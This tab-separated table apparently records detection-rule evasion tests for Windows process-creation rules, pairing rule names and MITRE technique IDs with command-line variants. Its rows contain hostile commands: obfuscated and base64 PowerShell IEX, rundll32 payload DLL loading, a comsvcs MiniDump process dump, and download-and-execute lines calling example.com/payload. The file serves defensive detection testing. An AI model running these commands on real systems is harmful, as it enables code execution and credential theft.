Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
t1027	proc_creation_win_powershell_cmdline_reversed_strings	Potential PowerShell Obfuscation Via Reversed Commands	b6b49cd1-34d6-4ead-b1bf-176e9edba9a4		"powershell.exe -Command ""'$s' = 'dnammoc'; $rev = [char[]]$s; [array]::Reverse($rev); iex (-join $rev)"""	FALSE	FALSE	FALSE	
t1027	proc_creation_win_powershell_cmdline_reversed_strings	Potential PowerShell Obfuscation Via Reversed Commands	b6b49cd1-34d6-4ead-b1bf-176e9edba9a4		"powershell.exe -Command ""'$s' = 'ekovn'; $rev = [char[]]$s; [array]::Reverse($rev); iex (-join $rev)"""	FALSE	FALSE	FALSE	
t1027	proc_creation_win_powershell_cmdline_reversed_strings	Potential PowerShell Obfuscation Via Reversed Commands	b6b49cd1-34d6-4ead-b1bf-176e9edba9a4		"powershell.exe -Command ""'$s' = 'eliFd'; $rev = [char[]]$s; [array]::Reverse($rev); iex (-join $rev)"""	FALSE	FALSE	FALSE	
t1027	proc_creation_win_powershell_cmdline_reversed_strings	Potential PowerShell Obfuscation Via Reversed Commands	b6b49cd1-34d6-4ead-b1bf-176e9edba9a4		"powershell.exe -Command ""'$s' = 'rahc'; $rev = [char[]]$s; [array]::Reverse($rev); iex (-join $rev)"""	FALSE	FALSE	FALSE	
t1027	proc_creation_win_powershell_cmdline_reversed_strings	Potential PowerShell Obfuscation Via Reversed Commands	b6b49cd1-34d6-4ead-b1bf-176e9edba9a4		"powershell.exe -Command ""'$s' = 'etirw'; $rev = [char[]]$s; [array]::Reverse($rev); iex (-join $rev)"""	FALSE	FALSE	FALSE	
t1027	proc_creation_win_powershell_cmdline_reversed_strings	Potential PowerShell Obfuscation Via Reversed Commands	b6b49cd1-34d6-4ead-b1bf-176e9edba9a4		"powershell.exe -Command ""'$s' = 'golon'; $rev = [char[]]$s; [array]::Reverse($rev); iex (-join $rev)"""	FALSE	FALSE	FALSE	
t1027	proc_creation_win_powershell_cmdline_special_characters	Potential PowerShell Command Line Obfuscation	d7bcd677-645d-4691-a8d4-7a5602b780d1		"powershell.exe -Command ""& ( '{0}{1}{2}' -f 'I','EX','' ) ('Wri'+'te-H'+'ost ''Bypass''')"""	FALSE	FALSE	FALSE	
t1027	proc_creation_win_powershell_cmdline_special_characters	Potential PowerShell Command Line Obfuscation	d7bcd677-645d-4691-a8d4-7a5602b780d1		"powershell.exe -Command ""& { $cmd = 'IEX' ; & $cmd ('Wri'+'te-H'+'ost ''Bypass'') }"""	FALSE	FALSE	FALSE	
t1027	proc_creation_win_powershell_cmdline_special_characters	Potential PowerShell Command Line Obfuscation	d7bcd677-645d-4691-a8d4-7a5602b780d1		"powershell.exe -Command ""& { function Invoke-Command { param($cmd) iex $cmd } Invoke-Command ('Wri'+'te-H'+'ost ''Bypass'') }"""	FALSE	FALSE	FALSE	
t1027	proc_creation_win_powershell_cmdline_special_characters	Potential PowerShell Command Line Obfuscation	d7bcd677-645d-4691-a8d4-7a5602b780d1		"powershell.exe -Command ""& { $cmd = 'Write-Host'; $arg = 'Bypass'; & $cmd $arg }"""	FALSE	FALSE	FALSE	
t1027	proc_creation_win_powershell_cmdline_special_characters	Potential PowerShell Command Line Obfuscation	d7bcd677-645d-4691-a8d4-7a5602b780d1		"powershell.exe -Command ""& { $cmd = 'Write-Host'; & $cmd 'Bypass' }"""	FALSE	FALSE	FALSE	
t1027	proc_creation_win_powershell_encoding_patterns	Potential Encoded PowerShell Patterns In CommandLine	cdf05894-89e7-4ead-b2b0-0a5f97a90f2f		"powershell.exe -Command ""[char[]](83,116,97,114,116,45,80,114,111,99,101,115,115,32,99,97,108,99,46,101,120,101) | Join-String -Separator ''"""	FALSE	FALSE	FALSE	
t1027	proc_creation_win_powershell_encoding_patterns	Potential Encoded PowerShell Patterns In CommandLine	cdf05894-89e7-4ead-b2b0-0a5f97a90f2f		"powershell.exe -Command ""(83,116,97,114,116,45,80,114,111,99,101,115,115,32,99,97,108,99,46,101,120,101 | ForEach-Object {[char]$_}) -join ''"""	FALSE	FALSE	FALSE	
t1027	proc_creation_win_powershell_encoding_patterns	Potential Encoded PowerShell Patterns In CommandLine	cdf05894-89e7-4ead-b2b0-0a5f97a90f2f		"powershell.exe -Command ""[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('U2t5c3NlcnZlciB0ZXN0')) | IEX"""	FALSE	FALSE	FALSE	
t1027	proc_creation_win_powershell_encoding_patterns	Potential Encoded PowerShell Patterns In CommandLine	cdf05894-89e7-4ead-b2b0-0a5f97a90f2f		"powershell.exe -Command ""[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('V3JpdGUtSG9zdCAiSGVsbG8i')) | IEX"""	FALSE	FALSE	FALSE	
t1027	proc_creation_win_powershell_frombase64string	Base64 Encoded PowerShell Command Detected	e32d4572-9826-4738-b651-95fa63747e8a		"powershell.exe -Command ""[Convert]::FromBase64String('SGVsbG8gV29ybGQ=')"""	FALSE	FALSE	FALSE	
t1027	proc_creation_win_powershell_frombase64string	Base64 Encoded PowerShell Command Detected	e32d4572-9826-4738-b651-95fa63747e8a		"powershell.exe -Command ""[System.Convert]::FromBase64String( 'SGVsbG8gV29ybGQ=' )"""	FALSE	FALSE	FALSE	
t1027	proc_creation_win_powershell_frombase64string	Base64 Encoded PowerShell Command Detected	e32d4572-9826-4738-b651-95fa63747e8a		"powershell.exe -Command ""$method = 'FromBase' + '64String'; [Convert]::$method('SGVsbG8gV29ybGQ=')"""	FALSE	FALSE	FALSE	
t1027	proc_creation_win_powershell_frombase64string	Base64 Encoded PowerShell Command Detected	e32d4572-9826-4738-b651-95fa63747e8a		"powershell.exe -Command ""IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\Microsoft\Windows\CurrentVersion Debug).Debug)))"""	FALSE	FALSE	FALSE	
t1027	proc_creation_win_powershell_frombase64string	Base64 Encoded PowerShell Command Detected	e32d4572-9826-4738-b651-95fa63747e8a		"powershell.exe -Command ""[Convert]::FromBase64String([System.Text.Encoding]::ASCII.GetBytes('SGVsbG8gV29ybGQ='))"""	FALSE	FALSE	FALSE	
t1027	proc_creation_win_powershell_frombase64string	Base64 Encoded PowerShell Command Detected	e32d4572-9826-4738-b651-95fa63747e8a		"powershell.exe -Command ""[Convert]::FromBase64String([System.Text.Encoding]::ASCII.GetString([System.Text.Encoding]::ASCII.GetBytes('SGVsbG8gV29ybGQ=')))"""	FALSE	FALSE	FALSE	
t1027	proc_creation_win_powershell_frombase64string	Base64 Encoded PowerShell Command Detected	e32d4572-9826-4738-b651-95fa63747e8a		"powershell.exe -Command ""[Convert]::FromBase64String([System.Text.Encoding]::ASCII.GetString([System.Text.Encoding]::ASCII.GetBytes([System.Text.Encoding]::ASCII.GetBytes('SGVsbG8gV29ybGQ='))))"""	FALSE	FALSE	FALSE	
t1027	proc_creation_win_renamed_autoit	Renamed AutoIt Execution	f4264e47-f522-4c38-a420-04525d5b880f		updater.exe /AutoIt3ExecuteScript script.au3	FALSE	FALSE	FALSE	
t1027	proc_creation_win_renamed_autoit	Renamed AutoIt Execution	f4264e47-f522-4c38-a420-04525d5b880f		updater.exe -AutoIt3ExecuteScript script.au3	FALSE	FALSE	FALSE	
t1027	proc_creation_win_renamed_autoit	Renamed AutoIt Execution	f4264e47-f522-4c38-a420-04525d5b880f		updater.exe script.au3 /ErrorStdOut	FALSE	FALSE	FALSE	
t1027	proc_creation_win_renamed_autoit	Renamed AutoIt Execution	f4264e47-f522-4c38-a420-04525d5b880f		updater.exe script.au3 /AutoIt3ExecuteScript /ErrorStdOut	FALSE	FALSE	FALSE	
t1027	proc_creation_win_renamed_autoit	Renamed AutoIt Execution	f4264e47-f522-4c38-a420-04525d5b880f		updater.exe script.au3 -AutoIt3ExecuteScript -ErrorStdOut	FALSE	FALSE	FALSE	
t1027	proc_creation_win_renamed_autoit	Renamed AutoIt Execution	f4264e47-f522-4c38-a420-04525d5b880f		updater.exe script.au3 /AutoIt3ExecuteScript	FALSE	FALSE	FALSE	
t1614.001	proc_creation_win_chcp_codepage_lookup	Console CodePage Lookup Via CHCP	7090adee-82e2-4269-bd59-80691e7c6338		chcp	FALSE	FALSE	FALSE	
t1614.001	proc_creation_win_chcp_codepage_lookup	Console CodePage Lookup Via CHCP	7090adee-82e2-4269-bd59-80691e7c6338		"cmd.exe /c ""chcp"""	FALSE	FALSE	FALSE	
t1614.001	proc_creation_win_chcp_codepage_lookup	Console CodePage Lookup Via CHCP	7090adee-82e2-4269-bd59-80691e7c6338		"cmd.exe /c ""chcp   """	FALSE	FALSE	FALSE	
t1614.001	proc_creation_win_chcp_codepage_lookup	Console CodePage Lookup Via CHCP	7090adee-82e2-4269-bd59-80691e7c6338		"cmd.exe /c ""copy chcp.com bypass.exe && bypass.exe"""	FALSE	FALSE	FALSE	
t1614.001	proc_creation_win_chcp_codepage_lookup	Console CodePage Lookup Via CHCP	7090adee-82e2-4269-bd59-80691e7c6338		"cmd.exe /v /c ""set a=chcp&& !a!"""	FALSE	FALSE	FALSE	
t1614.001	proc_creation_win_chcp_codepage_lookup	Console CodePage Lookup Via CHCP	7090adee-82e2-4269-bd59-80691e7c6338		"powershell.exe -Command ""& {chcp}"""	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_citrix_trolleyexpress_procdump	Process Access via TrolleyExpress Exclusion	4c0aaedc-154c-4427-ada0-d80ef9c9deb6		TrolleyExpress.exe 755	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_citrix_trolleyexpress_procdump	Process Access via TrolleyExpress Exclusion	4c0aaedc-154c-4427-ada0-d80ef9c9deb6		"TrolleyExpress.exe ""755"""	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_citrix_trolleyexpress_procdump	Process Access via TrolleyExpress Exclusion	4c0aaedc-154c-4427-ada0-d80ef9c9deb6		TrolleyExpress.exe -ma 755	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_citrix_trolleyexpress_procdump	Process Access via TrolleyExpress Exclusion	4c0aaedc-154c-4427-ada0-d80ef9c9deb6		TrolleyExpress.exe 1044	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_citrix_trolleyexpress_procdump	Process Access via TrolleyExpress Exclusion	4c0aaedc-154c-4427-ada0-d80ef9c9deb6		TrolleyExpress.exe 700	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_citrix_trolleyexpress_procdump	Process Access via TrolleyExpress Exclusion	4c0aaedc-154c-4427-ada0-d80ef9c9deb6		TrolleyExpress.exe 999	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_citrix_trolleyexpress_procdump	Process Access via TrolleyExpress Exclusion	4c0aaedc-154c-4427-ada0-d80ef9c9deb6		TrolleyExpress.exe 755\r\n	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_citrix_trolleyexpress_procdump	Process Access via TrolleyExpress Exclusion	4c0aaedc-154c-4427-ada0-d80ef9c9deb6		TrolleyExpress.exe 755 | echo bypass	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_citrix_trolleyexpress_procdump	Process Access via TrolleyExpress Exclusion	4c0aaedc-154c-4427-ada0-d80ef9c9deb6		TrolleyExpress.exe `755`	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_hktl_c3_rundll32_pattern	HackTool - F-Secure C3 Load by Rundll32	b18c9d4c-fac9-4708-bd06-dd5bfacf200f		rundll32.exe C:\Windows\Temp\payload.dll,StartNodeRelay	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_hktl_c3_rundll32_pattern	HackTool - F-Secure C3 Load by Rundll32	b18c9d4c-fac9-4708-bd06-dd5bfacf200f		rundll32.exe C:\Windows\Temp\payload.dll, StartNodeRelay	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_hktl_cobaltstrike_load_by_rundll32	CobaltStrike Load by Rundll32	ae9c6a7c-9521-42a6-915e-5aaa8689d529		rundll32.exe payload.dll,StartW	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_hktl_cobaltstrike_load_by_rundll32	CobaltStrike Load by Rundll32	ae9c6a7c-9521-42a6-915e-5aaa8689d529		rundll32.exe payload.dll, StartW	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_hktl_cobaltstrike_load_by_rundll32	CobaltStrike Load by Rundll32	ae9c6a7c-9521-42a6-915e-5aaa8689d529		"rundll32.exe ""payload.dll"",StartW"	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_hktl_cobaltstrike_load_by_rundll32	CobaltStrike Load by Rundll32	ae9c6a7c-9521-42a6-915e-5aaa8689d529		rundll32.exe C:\temp\payload.dll,StartW	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_lolbin_pcwutl	Code Execution via Pcwutl.dll	9386d78a-7207-4048-9c9f-a93a7c2d1c05		rundll32.exe pcwutl.dll,LaunchApplication calc.exe	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_installscreensaver	Rundll32 InstallScreenSaver Execution	15bd98ea-55f4-4d37-b09a-e7caa0fa2221		rundll32.exe desk.cpl,InstallScreenSaver test.scr	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_installscreensaver	Rundll32 InstallScreenSaver Execution	15bd98ea-55f4-4d37-b09a-e7caa0fa2221		rundll32.exe  desk.cpl,InstallScreenSaver test.scr	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_installscreensaver	Rundll32 InstallScreenSaver Execution	15bd98ea-55f4-4d37-b09a-e7caa0fa2221		"rundll32.exe"" desk.cpl,InstallScreenSaver test.scr"	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_shell32_susp_execution	Shell32 DLL Execution in Suspicious Directory	32b96012-7892-429e-b26c-ac2bf46066ff		"rundll32.exe ""shell32,Control_RunDLL"" payload.dll"	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_shell32_susp_execution	Shell32 DLL Execution in Suspicious Directory	32b96012-7892-429e-b26c-ac2bf46066ff		rundll32.exe shell32.dll,Control_RunDLL payload.dll	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_shell32_susp_execution	Shell32 DLL Execution in Suspicious Directory	32b96012-7892-429e-b26c-ac2bf46066ff		rundll32.exe shell32,Control_RunDLL payload.dll	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_shell32_susp_execution	Shell32 DLL Execution in Suspicious Directory	32b96012-7892-429e-b26c-ac2bf46066ff		rundll32.exe Control_RunDLL,shell32 payload.dll	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_susp_activity	Potentially Suspicious Rundll32 Activity	e593cf51-88db-4ee1-b920-37e89012a3c9		C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll MiniDump 204 C:\Users\thaim\AppData\Local\Temp\svchost-exe.dmp full	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_susp_activity	Potentially Suspicious Rundll32 Activity	e593cf51-88db-4ee1-b920-37e89012a3c9		"""C:\Windows\System32\rundll32.exe"" C:\windows\System32\comsvcs.dll,MiniDump 204 C:\Users\thaim\AppData\Local\Temp\svchost-exe.dmp full"	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_susp_activity	Potentially Suspicious Rundll32 Activity	e593cf51-88db-4ee1-b920-37e89012a3c9		C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll,MiniDump 204 C:\Users\thaim\AppData\Local\Temp\svchost-exe.dmp full	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_susp_control_dll_load	Suspicious Control Panel DLL Load	d7eb979b-c2b5-4a6f-a3a7-c87ce6763819		"rundll32.exe payload.dll,DllMain ""Shell32.dll"""	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_susp_control_dll_load	Suspicious Control Panel DLL Load	d7eb979b-c2b5-4a6f-a3a7-c87ce6763819		rundll32.exe payload.dll,DllMain Shell32.dll	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_susp_control_dll_load	Suspicious Control Panel DLL Load	d7eb979b-c2b5-4a6f-a3a7-c87ce6763819		RUNDLL32.EXE payload.dll,DllMain Shell32.dll	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_susp_control_dll_load	Suspicious Control Panel DLL Load	d7eb979b-c2b5-4a6f-a3a7-c87ce6763819		rundll32.exe payload.dll,DllMain C:\Windows\System32\Shell32.dll	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_susp_execution_with_image_extension	Suspicious Rundll32 Execution With Image Extension	4aa6040b-3f28-44e3-a769-9208e5feb5ec		"""C:\\WINDOWS\\system32\\rundll32.exe"" C:\\Users\\thaim\\Downloads\\calc.png StartW"	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_susp_execution_with_image_extension	Suspicious Rundll32 Execution With Image Extension	4aa6040b-3f28-44e3-a769-9208e5feb5ec		cd C:\\test\\ && copy malicious.dll photo.jpg && rundll32.exe .\\photo.jpg,DllMain	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_susp_execution_with_image_extension	Suspicious Rundll32 Execution With Image Extension	4aa6040b-3f28-44e3-a769-9208e5feb5ec		copy calc.dll calc.dat && rundll32.exe calc.dat,DllMain	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_susp_execution_with_image_extension	Suspicious Rundll32 Execution With Image Extension	4aa6040b-3f28-44e3-a769-9208e5feb5ec		"rundll32.exe ""C:\\path\\to\\malicious_image.jpg "" ,DllMain"	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_susp_execution_with_image_extension	Suspicious Rundll32 Execution With Image Extension	4aa6040b-3f28-44e3-a769-9208e5feb5ec		rundll32.exe shell32.dll,Control_RunDLL C:\\Users\\Public\\malicious.png	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_sys	Suspicious Rundll32 Activity Invoking Sys File	731231b9-0b5d-4219-94dd-abb6959aa7ea		rundll32.exe dummy\.\sys,EntryPoint	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_sys	Suspicious Rundll32 Activity Invoking Sys File	731231b9-0b5d-4219-94dd-abb6959aa7ea		rundll32.exe dummy.sys\.,EntryPoint	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_sys	Suspicious Rundll32 Activity Invoking Sys File	731231b9-0b5d-4219-94dd-abb6959aa7ea		"rundll32.exe dummy.sys"",EntryPoint"	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_sys	Suspicious Rundll32 Activity Invoking Sys File	731231b9-0b5d-4219-94dd-abb6959aa7ea		rundll32.exe dummy.sys,EntryPoint	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_udl_exec	Potentially Suspicious Rundll32.EXE Execution of UDL File	0ea52357-cd59-4340-9981-c46c7e900428		"rundll32.exe oledb32.dll,OpenDSLFile ""C:\Users\Public\Downloads\example.udl"""	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_udl_exec	Potentially Suspicious Rundll32.EXE Execution of UDL File	0ea52357-cd59-4340-9981-c46c7e900428		cmd.exe /c rundll32.exe oledb32.dll,OpenDSLFile C:\Users\user\Downloads\test.udl	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_udl_exec	Potentially Suspicious Rundll32.EXE Execution of UDL File	0ea52357-cd59-4340-9981-c46c7e900428		"rundll32.exe oledb32.dll,OpenDSLFile ""C:\Users\admin\Downloads\test.udl"""	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_udl_exec	Potentially Suspicious Rundll32.EXE Execution of UDL File	0ea52357-cd59-4340-9981-c46c7e900428		rundll32.exe oledb32.dll,OpenDSLFile C:\ProgramData\test.udl	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_uncommon_dll_extension	Rundll32 Execution With Uncommon DLL Extension	c3a99af4-35a9-4668-879e-c09aeb4f2bdf		rundll32.exe  C:\Users\thaim\Downloads\calc.png StartW	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_uncommon_dll_extension	Rundll32 Execution With Uncommon DLL Extension	c3a99af4-35a9-4668-879e-c09aeb4f2bdf		"rundll32  vbscript:""\..\mshtml,#135 ""+String(CreateObject(""WScript.Shell"").Run(""calc.exe""),0)"	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_uncommon_dll_extension	Rundll32 Execution With Uncommon DLL Extension	c3a99af4-35a9-4668-879e-c09aeb4f2bdf		rundll32.exe  C:\AtomicRedTeam\atomics\T1218.011\bin\_WT.init,krnl	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_uncommon_dll_extension	Rundll32 Execution With Uncommon DLL Extension	c3a99af4-35a9-4668-879e-c09aeb4f2bdf		"rundll32.exe  javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct"").Exec();window.close();"	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_uncommon_dll_extension	Rundll32 Execution With Uncommon DLL Extension	c3a99af4-35a9-4668-879e-c09aeb4f2bdf		"""C:\Windows\System32\RUNDLL32.EXE"" -sta {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}"	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_uncommon_dll_extension	Rundll32 Execution With Uncommon DLL Extension	c3a99af4-35a9-4668-879e-c09aeb4f2bdf		"""C:\WINDOWS\system32\rundll32.exe"" keymgr,KRShowKeyMgr"	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_uncommon_dll_extension	Rundll32 Execution With Uncommon DLL Extension	c3a99af4-35a9-4668-879e-c09aeb4f2bdf		rundll32  C:\Users\thaim\Downloads\calc.png,StartW	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_uncommon_dll_extension	Rundll32 Execution With Uncommon DLL Extension	c3a99af4-35a9-4668-879e-c09aeb4f2bdf		rundll32.exe  C:\Users\thaim\Downloads\calc.png,StartW	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_susp_powershell_execution_via_dll	Potential PowerShell Execution Via DLL	6812a10b-60ea-420c-832f-dfcc33b646ba		"rundll32.exe PowerShdll.dll,main -c ""I`e`x (New-Object Net.WebClient).D`o`wnloadString('http://example.com/payload')"""	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_susp_powershell_execution_via_dll	Potential PowerShell Execution Via DLL	6812a10b-60ea-420c-832f-dfcc33b646ba		"rundll32.exe PowerShdll.dll,main -c ""IEX(New-Object Net.WebClient).DownloadData('http://example.com/payload')"""	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_susp_powershell_execution_via_dll	Potential PowerShell Execution Via DLL	6812a10b-60ea-420c-832f-dfcc33b646ba		"rundll32.exe PowerShdll.dll,main -c ""Invoke-RestMethod -Uri http://example.com/payload | IEX"""	FALSE	FALSE	FALSE	
t1090.001	proc_creation_win_cloudflared_quicktunnel_execution	Cloudflared Quick Tunnel Execution	222129f7-f4dc-4568-b0d2-22440a9639ba		"""cloudflared.exe"" --url http://example.com"	FALSE	FALSE	FALSE	
t1090.001	proc_creation_win_cloudflared_quicktunnel_execution	Cloudflared Quick Tunnel Execution	222129f7-f4dc-4568-b0d2-22440a9639ba		"""cloudflared.exe"" -url http://example.com"	FALSE	FALSE	FALSE	
t1090.001	proc_creation_win_cloudflared_quicktunnel_execution	Cloudflared Quick Tunnel Execution	222129f7-f4dc-4568-b0d2-22440a9639ba		"""cloudflared.exe"" --url=http://example.com"	FALSE	FALSE	FALSE	
t1090.001	proc_creation_win_cloudflared_quicktunnel_execution	Cloudflared Quick Tunnel Execution	222129f7-f4dc-4568-b0d2-22440a9639ba		"""cloudflared.exe"" --url ""http://example.com"""	FALSE	FALSE	FALSE	
t1090.001	proc_creation_win_cloudflared_quicktunnel_execution	Cloudflared Quick Tunnel Execution	222129f7-f4dc-4568-b0d2-22440a9639ba		"""cloudflared.exe"" --url http://example.com -no-autoupdate"	FALSE	FALSE	FALSE	
t1090.001	proc_creation_win_cloudflared_quicktunnel_execution	Cloudflared Quick Tunnel Execution	222129f7-f4dc-4568-b0d2-22440a9639ba		"""cloudflared.exe"" -url http://example.com -no-autoupdate"	FALSE	FALSE	FALSE	
t1090.001	proc_creation_win_cloudflared_quicktunnel_execution	Cloudflared Quick Tunnel Execution	222129f7-f4dc-4568-b0d2-22440a9639ba		"""cloudflared.exe"" --url http://example.com --no-autoupdate"	FALSE	FALSE	FALSE	
t1090.001	proc_creation_win_pua_chisel	PUA - Chisel Tunneling Tool Execution	8b0e12da-d3c3-49db-bb4f-256703f380e5		chisel.exe client 10.0.0.5:8080	FALSE	FALSE	FALSE	
t1090.001	proc_creation_win_renamed_cloudflared	Renamed Cloudflared.EXE Execution	e0c69ebd-b54f-4aed-8ae3-e3467843f3f0		"""cloudflared.exe"" tunnel run -config C:\temp\myconfig.yml --token abcdef123456"	FALSE	FALSE	FALSE	
t1090.001	proc_creation_win_renamed_cloudflared	Renamed Cloudflared.EXE Execution	e0c69ebd-b54f-4aed-8ae3-e3467843f3f0		"""cloudflared.exe"" tunnel run --config C:\temp\myconfig.yml -token abcdef123456"	FALSE	FALSE	FALSE	
t1090.001	proc_creation_win_renamed_cloudflared	Renamed Cloudflared.EXE Execution	e0c69ebd-b54f-4aed-8ae3-e3467843f3f0		"""cloudflared.exe"" tunnel run --config C:\temp\myconfig.yml --token abcdef123456"	FALSE	FALSE	FALSE	
t1102	proc_creation_win_cloudflared_tunnel_cleanup	Cloudflared Tunnel Connections Cleanup	7050bba1-1aed-454e-8f73-3f46f09ce56a		cloudflared tunnel cleanup --config C:\temp\config.yml	FALSE	FALSE	FALSE	
t1102	proc_creation_win_cloudflared_tunnel_cleanup	Cloudflared Tunnel Connections Cleanup	7050bba1-1aed-454e-8f73-3f46f09ce56a		"cloudflared tunnel cleanup --config=""C:\temp\config.yml"""	FALSE	FALSE	FALSE	
t1102	proc_creation_win_cloudflared_tunnel_cleanup	Cloudflared Tunnel Connections Cleanup	7050bba1-1aed-454e-8f73-3f46f09ce56a		cloudflared.exe tunnel cleanup -config C:\temp\config.yml	FALSE	FALSE	FALSE	
t1102	proc_creation_win_cloudflared_tunnel_cleanup	Cloudflared Tunnel Connections Cleanup	7050bba1-1aed-454e-8f73-3f46f09ce56a		cloudflared.exe tunnel cleanup -config=C:\temp\config.yml	FALSE	FALSE	FALSE	
t1102	proc_creation_win_cloudflared_tunnel_cleanup	Cloudflared Tunnel Connections Cleanup	7050bba1-1aed-454e-8f73-3f46f09ce56a		cloudflared.exe tunnel cleanup --config C:\temp\config.yml --connector-id=ABC123	FALSE	FALSE	FALSE	
t1102	proc_creation_win_cloudflared_tunnel_cleanup	Cloudflared Tunnel Connections Cleanup	7050bba1-1aed-454e-8f73-3f46f09ce56a		"cloudflared.exe tunnel cleanup --config C:\temp\config.yml --connector-id=""ABC-123-DEF"""	FALSE	FALSE	FALSE	
t1102	proc_creation_win_cloudflared_tunnel_cleanup	Cloudflared Tunnel Connections Cleanup	7050bba1-1aed-454e-8f73-3f46f09ce56a		cloudflared.exe tunnel cleanup --config C:\temp\config.yml --connector-id=ABC123 --	FALSE	FALSE	FALSE	
t1102	proc_creation_win_cloudflared_tunnel_cleanup	Cloudflared Tunnel Connections Cleanup	7050bba1-1aed-454e-8f73-3f46f09ce56a		cloudflared.exe tunnel cleanup --config C:\temp\config.yml --connector-id=ABC123 -v	FALSE	FALSE	FALSE	
